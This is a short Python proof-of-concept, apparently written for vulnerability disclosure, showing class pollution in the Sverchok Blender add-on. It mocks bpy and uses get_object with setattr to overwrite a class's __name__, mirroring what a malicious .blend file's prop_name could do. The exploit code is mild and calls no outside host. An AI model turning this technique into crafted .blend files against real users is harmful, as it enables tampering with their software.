# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: SvSetPropNodeMK2.process (get_object + setattr)
# Type: get-attr-set-attr
# Trigger: Blender node tree with malicious prop_name property
#
# sverchok's SvSetPropNodeMK2 node processes user-defined property paths.
# The prop_name field is parsed via AST, traversed via get_object (getattr),
# and written via setattr. A malicious .blend file can set prop_name to
# traverse into __class__.__name__ etc.

import sys
import types

# Mock bpy
bpy_mock = types.ModuleType('bpy')
bpy_mock.types = types.ModuleType('bpy.types')
bpy_mock.types.bpy_prop_array = list
bpy_mock.props = types.ModuleType('bpy.props')
bpy_mock.props.StringProperty = lambda **kw: ""
bpy_mock.props.BoolProperty = lambda **kw: False
sys.modules['bpy'] = bpy_mock
sys.modules['bpy.types'] = bpy_mock.types
sys.modules['bpy.props'] = bpy_mock.props

from nodes.object_nodes.getsetprop_mk2 import get_object

class Target: pass
target = Target()

import nodes.object_nodes.getsetprop_mk2 as setprop_mod
setprop_mod.__dict__['target'] = target

payload_value = "pwnd"

def run_poc():
  # Simulates a .blend file where a SvSetPropNodeMK2 node has:
  #   prop_name = "target.__class__.__name__"
  # process() calls get_object(path[:-1]) then setattr(obj, leaf, data)
  full_path = [("name", "target"), ("attr", "__class__"), ("attr", "__name__")]
  obj = get_object(full_path[:-1])
  p_type, value = full_path[-1]
  setattr(obj, value, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
